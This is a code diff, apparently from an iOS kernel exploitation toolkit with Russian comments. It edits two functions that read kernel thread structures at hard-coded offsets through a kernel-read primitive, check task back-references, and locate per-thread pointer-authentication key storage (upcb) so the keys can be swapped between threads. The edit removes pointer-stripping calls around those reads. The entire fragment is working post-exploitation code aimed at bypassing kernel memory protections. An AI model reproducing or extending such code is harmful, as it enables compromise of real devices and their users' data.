@@ -165,10 +165,10 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     // Независимая валидация worker thread_t: обратная ссылка tro→task должна
     // вести на наш таск (та же, что и у remote-треда). Резолвер для pthread
     // может вернуть чужой объект — запись по нему = паника (доказано).
-    uint64_t tro_main = kp_pac_nativestrip(kp_rc_kread64(remotethreadaddr + 0x3E8));
-    uint64_t selfTask = kp_pac_nativestrip(kp_rc_kread64(tro_main + 0x28));
-    uint64_t tro_w = kp_pac_nativestrip(kp_rc_kread64(kva + 0x3E8));
-    uint64_t tsk_w = kp_pac_nativestrip(kp_rc_kread64(tro_w + 0x28));
+    uint64_t tro_main = kp_rc_kread64(remotethreadaddr + 0x3E8);
+    uint64_t selfTask = kp_rc_kread64(tro_main + 0x28);
+    uint64_t tro_w = kp_rc_kread64(kva + 0x3E8);
+    uint64_t tsk_w = kp_rc_kread64(tro_w + 0x28);
     int kva_ok = (selfTask & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL && tsk_w == selfTask;
     paclog(@"    [rp] validate: selfTask=%#llx worker→task=%#llx %@", selfTask, tsk_w,
            kva_ok ? @"OK" : @"— НЕ НАШ ТРЕД, стоп (записей не будет)");
@@ -176,8 +176,8 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
 
     // upcb — настоящее хранилище ключей (arm_pac_key_state_t), тип 0x21.
     // ОБА upcb обязаны быть kernel VA — запись по user VA = copy_validate panic.
-    uint64_t upcb = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
-    uint64_t rupcb = kp_pac_nativestrip(kp_rc_kread64(remotethreadaddr + 0x100));
+    uint64_t upcb = kp_rc_kread64(kva + 0x100);
+    uint64_t rupcb = kp_rc_kread64(remotethreadaddr + 0x100);
     int upcb_ok = (upcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
     int rupcb_ok = (rupcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
     int do_swap = upcb_ok && rupcb_ok;
@@ -238,8 +238,8 @@ void kp_upcbcalib(uint64_t threadVA)
     uint64_t kva = [KPDump rcResolveThreadKVA:pthread_mach_thread_np(pt)];
     if (!kva) { paclog(@"    [cal] resolve fail"); g_pac_stop = 1; return; }
 
-    uint64_t upcbA = kp_pac_nativestrip(kp_rc_kread64(threadVA + 0x100));
-    uint64_t upcbB = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
+    uint64_t upcbA = kp_rc_kread64(threadVA + 0x100);
+    uint64_t upcbB = kp_rc_kread64(kva + 0x100);
     paclog(@"    [cal] upcbA=%#llx upcbB=%#llx", upcbA, upcbB);
     if ((upcbA & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL ||
         (upcbB & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) { g_pac_stop = 1; return; }
